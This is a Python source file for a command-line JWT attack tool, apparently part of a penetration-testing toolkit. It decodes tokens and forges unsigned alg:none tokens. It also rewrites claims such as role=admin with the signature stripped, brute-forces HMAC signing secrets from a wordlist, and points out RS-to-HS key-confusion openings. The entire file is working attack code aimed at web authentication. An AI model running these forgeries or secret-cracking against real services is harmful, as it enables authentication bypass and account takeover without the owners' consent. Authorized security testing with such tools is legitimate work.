#!/usr/bin/python3
"""
JWT Analyser — decode, tamper, and attack JSON Web Tokens.

Attacks supported (no Cryptodome required):
  1. Decode   — base64-decode header + payload, pretty-print claims
  2. alg:none — strip signature, set alg to none (many libraries accept this)
  3. Tamper   — modify any claim and re-encode (unsigned or original sig)
  4. Crack    — HMAC-SHA256 brute-force with a wordlist
  5. Confusion hint — detect RS256 and flag the RS→HS key-confusion attack

Usage:
  ../.venv/bin/python3 modules/jwt_analyser.py -t <token>
  ../.venv/bin/python3 modules/jwt_analyser.py -t <token> --alg-none
  ../.venv/bin/python3 modules/jwt_analyser.py -t <token> --crack wordlist.txt
  ../.venv/bin/python3 modules/jwt_analyser.py -t <token> --set claim=value --set role=admin
"""
import argparse
import base64
import hashlib
import hmac
import json
import sys

from core.colors import bold, underline, end, red, yellow, green, run, good, bad, info, tab


# ── helpers ────────────────────────────────────────────────────────────────

def _b64_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def _b64_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def parse_token(token: str) -> tuple[dict, dict, str]:
    parts = token.strip().split(".")
    if len(parts) != 3:
        print(f"{bad} Not a valid JWT (expected 3 parts, got {len(parts)}).")
        sys.exit(1)
    header  = json.loads(_b64_decode(parts[0]))
    payload = json.loads(_b64_decode(parts[1]))
    return header, payload, parts[2]


def encode_token(header: dict, payload: dict, sig: str = "") -> str:
    h = _b64_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}.{sig}"


# ── attacks ────────────────────────────────────────────────────────────────

def decode(token: str) -> None:
    header, payload, sig = parse_token(token)
    print(f"\n{bold}{underline}Header{end}")
    print(json.dumps(header, indent=2))
    print(f"\n{bold}{underline}Payload{end}")
    print(json.dumps(payload, indent=2))
    print(f"\n{bold}{underline}Signature{end}")
    print(sig or "(empty)")

    alg = header.get("alg", "").upper()
    if alg == "NONE" or not sig:
        print(f"\n{tab}{bad} {red}{bold}alg:none — this token is UNSIGNED.{end}")
    if alg.startswith("RS") or alg.startswith("EC"):
        print(f"\n{tab}{info} {yellow}Algorithm is {alg} — potential RS→HS key-confusion attack.{end}")
        print(f"{tab}     If the server accepts HS256 signed with the RSA public key as secret,")
        print(f"{tab}     you can forge arbitrary tokens. Verify manually with --alg-none first.")


def alg_none(token: str) -> str:
    header, payload, _ = parse_token(token)
    header["alg"] = "none"
    forged = encode_token(header, payload, "")
    print(f"\n{good} {bold}alg:none token:{end}")
    print(f"{tab}{green}{forged}{end}")
    print(f"\n{tab}{info} Send this token and check if the server accepts it.")
    return forged


def tamper(token: str, claims: dict[str, str]) -> str:
    header, payload, sig = parse_token(token)
    for k, v in claims.items():
        try:
            payload[k] = json.loads(v)
        except (json.JSONDecodeError, ValueError):
            payload[k] = v
    forged = encode_token(header, payload, "")
    print(f"\n{good} {bold}Tampered token (signature stripped — unsigned):{end}")
    print(f"{tab}{green}{forged}{end}")
    return forged


def crack(token: str, wordlist: str) -> str | None:
    header, _, sig = parse_token(token)
    alg = header.get("alg", "").upper()
    if not alg.startswith("HS"):
        print(f"{bad} crack only supports HMAC (HS256/384/512). Token uses {alg}.")
        return None

    hash_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    h_fn = hash_map.get(alg, hashlib.sha256)

    parts = token.strip().split(".")
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    expected_sig  = _b64_decode(parts[2])

    print(f"{run} Cracking {alg} signature with {bold}{wordlist}{end} ...")
    try:
        with open(wordlist, errors="replace") as f:
            for line in f:
                secret = line.strip().encode()
                candidate = hmac.new(secret, signing_input, h_fn).digest()
                if hmac.compare_digest(candidate, expected_sig):
                    print(f"\n{good} {green}{bold}SECRET FOUND:{end} {secret.decode(errors='replace')}")
                    return secret.decode(errors="replace")
    except FileNotFoundError:
        print(f"{bad} Wordlist not found: {wordlist}")
        return None

    print(f"{bad} Secret not found in wordlist.")
    return None


# ── CLI ────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="JWT decode, tamper, and attack tool")
    parser.add_argument("-t",         dest="token",    required=True, help="JWT token")
    parser.add_argument("--decode",   action="store_true", default=True, help="Decode token (default)")
    parser.add_argument("--alg-none", action="store_true", help="Generate alg:none variant")
    parser.add_argument("--crack",    dest="wordlist", help="Crack HMAC secret with wordlist")
    parser.add_argument("--set",      dest="claims",   action="append", metavar="key=value",
                        help="Tamper: set a claim (can repeat)")
    args = parser.parse_args()

    decode(args.token)

    if args.alg_none:
        alg_none(args.token)

    if args.claims:
        claims_dict = {}
        for c in args.claims:
            k, _, v = c.partition("=")
            claims_dict[k] = v
        tamper(args.token, claims_dict)

    if args.wordlist:
        crack(args.token, args.wordlist)


if __name__ == "__main__":
    main()
